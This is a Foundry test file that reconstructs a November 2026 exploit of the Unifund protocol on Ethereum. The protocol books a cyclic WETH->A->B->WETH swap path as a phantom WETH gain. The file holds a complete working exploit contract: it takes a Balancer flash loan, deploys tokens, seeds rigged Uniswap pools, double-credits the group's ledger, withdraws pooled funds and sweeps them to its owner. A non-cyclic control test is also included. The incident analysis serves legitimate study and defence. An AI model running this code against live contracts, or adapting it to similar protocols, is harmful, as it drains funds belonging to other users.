// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// Unifund cyclic-path WETH double-count drain (Ethereum, 2026-11)
//
// @Incident
// Unifund lets a group swap its pooled funds along an arbitrary Uniswap V2 path. A cyclic path
// WETH -> A -> B -> WETH credits the group's WETH ledger key on the output leg while the input leg
// was debited against the same key, so the round trip (which nets about zero WETH) is booked as a
// WETH gain. finish() then withdraw() pay that phantom balance out of the core's shared pool, taking
// funds that belong to other groups.
//   Chain             : Ethereum
//   Exploit tx        : https://etherscan.io/tx/0x5f1e276e99e63289dd4932ad18a96d7642cbdc92241652ee175271b3e63027a0 (one of five)
//   Attacker EOA      : https://etherscan.io/address/0x6ee1702ca602ddab66f984aaebaac0451068f881
//   Unifund core      : https://etherscan.io/address/0x152ad66bd57da8d539abaaf98d7c378621c36227 (unverified diamond)
//   Swap facet        : https://etherscan.io/address/0x489176b37cb9da4149940707ce39135adc41cec5 (unverified)
//   Flash loan source : https://etherscan.io/address/0xba12222222228d8ba445958a75a0704d566bf2c8 (Balancer V2 Vault)
//
// @Root cause
// swapExactTokensForTokens(uint64 groupId, uint256 amountIn, uint256 amountOutMin, address[] path,
// uint256 deadline) accepts a path whose first and last token are identical. The facet accounts the
// input-side WETH spent and the output-side WETH received as two separate deltas against one ledger
// key instead of netting them, so a swap that nets about zero WETH is recorded as a WETH gain. There
// is no guard against path[0] == path[last]. The whole flow (createTokenList, addTokensToList,
// lockTokenList, create, join, startFunding, the cyclic swap, finish, withdraw) is reachable by a
// fresh EOA with no role, and the double-count is a side effect of the attacker's own swap.
//
// @Reconstruction
// Fork mainnet at the exploit block. A fresh attacker contract drives the real contracts with typed
// interface calls, no vm.mock / vm.store / vm.prank of any protocol identity:
//   1. Flash-borrow 12 WETH from the Balancer V2 Vault (real flashLoan / receiveFlashLoan, repaid in
//      the same callback, no deal() for the borrowed WETH).
//   2. Deploy two scratch ERC20s A and B (the attacker's own path tokens, standing in for the two
//      custom tokens the attacker deployed in the live attack) and seed rigged Uniswap V2 pools
//      WETH/A, A/B, B/WETH so the cyclic path is routable.
//   3. Buy iFUND with 0.1 WETH (needed to create and join a group), build a token list over A and B,
//      create a group, join it with 1 ETH, startFunding.
//   4. Swap twice along the cyclic path WETH -> A -> B -> WETH. Each swap double-credits the group's
//      WETH ledger key.
//   5. finish() then withdraw() realize the phantom WETH, paid out of the core's pooled funds. Repay
//      the flash loan in the same callback.
// The ids in the real selectors are uint64 and three create() params are uint16 (recovered from the
// tx and 4byte); a uint256 interface routes to the wrong facet selector and reverts.
//
// @Result
// The core held 4.994488833099649474 WETH entering this tx (the ~4.9941 WETH headline). The single
// cyclic-swap group reconstructed here pulls 4.628136547384151187 WETH of it out as phantom credit,
// leaving 0.366352285715498287 WETH; testExploit asserts that measured drain. testControlNonCyclic
// runs the identical setup with the non-cyclic path WETH -> A -> B and the core is not drained,
// isolating the cyclic path as the cause. The attacker EOA's cross-tx net over its three txs was
// about 4.7555 ETH; this file reconstructs one of the five exploit txs, so it asserts that tx's
// measured victim drain rather than the cross-tx figure.
//
// @Run
// forge test --contracts src/test/2026-11/Unifund_exp.sol -vvv

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData) external;
}

interface IUniV2Factory {
    function createPair(address, address) external returns (address);
}

interface IUniV2Router {
    function addLiquidity(address, address, uint256, uint256, uint256, uint256, address, uint256)
        external returns (uint256, uint256, uint256);
    function swapExactTokensForTokens(uint256, uint256, address[] calldata, address, uint256)
        external returns (uint256[] memory);
}

// Real external selectors (recovered from the on-chain tx + 4byte): the list/group ids are uint64
// and three create() params are uint16. A uint256 interface routes to the wrong facet selector.
interface IUnifund {
    function createTokenList() external returns (uint64);
    function addTokensToList(uint64 listId, address[] calldata tokens) external;
    function lockTokenList(uint64 listId) external;
    function groupCount() external view returns (uint64);
    function create(uint64, uint16, uint16, uint16, uint256, uint256, uint256, uint256, uint256, string calldata)
        external returns (uint64);
    function join(uint64 groupId) external payable;
    function startFunding(uint64 groupId) external;
    function swapExactTokensForTokens(uint64 groupId, uint256 amountIn, uint256 amountOutMin, address[] calldata path, uint256 deadline) external;
    function finish(uint64 groupId) external;
    function withdraw(uint64 groupId, address token) external;
}

// The attacker's own path tokens A and B. In the live attack these were two custom ERC20s the
// attacker deployed (0x585df9..., 0xb11c356e...); here they are plain ERC20s the attacker mints to
// itself. They are worthless scratch tokens the attacker controls, not the exploited asset.
contract PathToken {
    string public name = "A";
    string public symbol = "A";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    constructor(uint256 supply) {
        balanceOf[msg.sender] = supply;
        totalSupply = supply;
    }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) { _t(msg.sender, to, a); return true; }
    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        if (allowance[f][msg.sender] != type(uint256).max) allowance[f][msg.sender] -= a;
        _t(f, to, a); return true;
    }
    function _t(address f, address to, uint256 a) internal {
        balanceOf[f] -= a; balanceOf[to] += a;
    }
}

contract UnifundExploit {
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant IFUND = IERC20(0x04B5E13000C6e9A3255Dc057091F3e3Eeee7b0f0);
    IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IUniV2Factory constant FACTORY = IUniV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    IUniV2Router constant ROUTER = IUniV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUnifund constant UNIFUND = IUnifund(0x152ad66BD57DA8d539abaaF98D7C378621C36227);

    uint256 constant FLASH = 12 ether;

    PathToken public A;
    PathToken public B;
    address public owner;
    bool public cyclic; // true: WETH->A->B->WETH (double-counts); false: WETH->A->B (control)

    constructor(bool _cyclic) { owner = msg.sender; cyclic = _cyclic; }

    // Positive case: flash-borrow WETH, run the body, repay from the phantom payout. This is the
    // faithful on-chain reconstruction (the real tx flash-borrowed 12 WETH from Balancer).
    function attack() external {
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASH;
        VAULT.flashLoan(address(this), tokens, amounts, "");
        uint256 bal = address(this).balance;
        (bool ok,) = owner.call{value: bal}("");
        require(ok, "sweep");
    }

    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) external {
        require(msg.sender == address(VAULT), "not vault");
        _body();
        // Repay the flash loan from the realized (phantom) balance.
        uint256 have = WETH.balanceOf(address(this));
        if (have < FLASH) WETH.deposit{value: FLASH - have}();
        WETH.transfer(address(VAULT), FLASH);
    }

    // Negative control: no flash loan (there is no phantom to repay one with). Runs on the
    // contract's own small working WETH balance so the only variable versus the positive case is
    // the swap path. Proves the non-cyclic path does not drain the core.
    function control() external {
        WETH.deposit{value: address(this).balance}();
        _body();
    }

    function _body() internal {
        // Deploy the attacker's own path tokens and seed rigged Uniswap pools.
        A = new PathToken(1e30);
        B = new PathToken(1e30);

        // Buy iFUND (protocol token needed to create/join a group) with 0.1 WETH.
        WETH.approve(address(ROUTER), type(uint256).max);
        address[] memory pIf = new address[](2);
        pIf[0] = address(WETH); pIf[1] = address(IFUND);
        ROUTER.swapExactTokensForTokens(0.1 ether, 0, pIf, address(this), block.timestamp);
        IFUND.approve(address(UNIFUND), type(uint256).max);

        // Create the cyclic-path pools WETH->A->B->WETH.
        FACTORY.createPair(address(WETH), address(A));
        FACTORY.createPair(address(A), address(B));
        FACTORY.createPair(address(B), address(WETH));
        A.approve(address(ROUTER), type(uint256).max);
        B.approve(address(ROUTER), type(uint256).max);
        uint256 wethSeed = cyclic ? 8.5 ether : 0.05 ether;
        ROUTER.addLiquidity(address(WETH), address(A), 1e15, 1e24, 0, 0, address(this), block.timestamp);
        ROUTER.addLiquidity(address(A), address(B), 1e24, 1e24, 0, 0, address(this), block.timestamp);
        ROUTER.addLiquidity(address(B), address(WETH), 332332333336342351360360, wethSeed, 0, 0, address(this), block.timestamp);

        // Build a token list from the attacker's own tokens and create a group over it.
        uint64 listId = UNIFUND.createTokenList();
        address[] memory list = new address[](2);
        list[0] = address(A); list[1] = address(B);
        UNIFUND.addTokensToList(listId, list);
        UNIFUND.lockTokenList(listId);
        uint64 groupId = UNIFUND.groupCount();
        UNIFUND.create(listId, 720, 168, 500, 1e22, 5e20, 1e18, 1e18, 1e18, "rc");

        // Join with 1 ETH and start.
        WETH.withdraw(1 ether);
        UNIFUND.join{value: 1 ether}(groupId);
        UNIFUND.startFunding(groupId);

        // Cyclic path WETH->A->B->WETH makes the facet account the input-side and output-side WETH
        // deltas separately against the same ledger key, double-crediting WETH. The control path
        // WETH->A->B ends in B and never re-credits WETH, so no phantom appears.
        address[] memory path;
        if (cyclic) {
            path = new address[](4);
            path[0] = address(WETH); path[1] = address(A); path[2] = address(B); path[3] = address(WETH);
        } else {
            path = new address[](3);
            path[0] = address(WETH); path[1] = address(A); path[2] = address(B);
        }
        UNIFUND.swapExactTokensForTokens(groupId, 1e15, 0, path, block.timestamp);
        UNIFUND.swapExactTokensForTokens(groupId, 1e15, 0, path, block.timestamp);

        // Realize the (double-counted) balance out of the group via finish + withdraw.
        UNIFUND.finish(groupId);
        UNIFUND.withdraw(groupId, address(0));
    }

    receive() external payable {}
}

contract Unifund_exp is Test {
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address constant CORE = 0x152ad66BD57DA8d539abaaF98D7C378621C36227;

    function setUp() public {
        vm.createSelectFork("mainnet", 26388566);
    }

    // Cyclic swap path double-credits the group's WETH ledger key; finish + withdraw pay the
    // phantom out of the core's pooled funds. The measured victim loss is the core WETH drop.
    function testExploit() public {
        uint256 coreBefore = WETH.balanceOf(CORE);
        emit log_named_decimal_uint("core WETH before", coreBefore, 18);

        UnifundExploit exploit = new UnifundExploit(true);
        exploit.attack();

        uint256 coreAfter = WETH.balanceOf(CORE);
        uint256 drained = coreBefore - coreAfter;
        emit log_named_decimal_uint("core WETH after ", coreAfter, 18);
        emit log_named_decimal_uint("phantom drained ", drained, 18);

        // The core held 4.9944 WETH (the ~4.9941 WETH headline); the single cyclic-swap group here
        // pulls ~4.628 WETH of it out as phantom credit. Assert the measured drain.
        assertApproxEqRel(drained, 4.628e18, 0.01e18, "phantom drain off measured ~4.628 WETH");
    }

    // Negative control: identical setup, non-cyclic path WETH->A->B. No phantom WETH is credited,
    // so finish + withdraw take nothing from the core.
    function testControlNonCyclic() public {
        uint256 coreBefore = WETH.balanceOf(CORE);

        UnifundExploit exploit = new UnifundExploit(false);
        vm.deal(address(exploit), 2 ether); // attacker's own working capital, nothing is stolen here
        exploit.control();

        uint256 coreAfter = WETH.balanceOf(CORE);
        emit log_named_decimal_uint("control core before", coreBefore, 18);
        emit log_named_decimal_uint("control core after ", coreAfter, 18);

        // Core is not drained by the non-cyclic path (allow dust from rounding, assert no real loss).
        assertGe(coreAfter + 1e15, coreBefore, "non-cyclic path should not drain the core");
    }

    receive() external payable {}
}
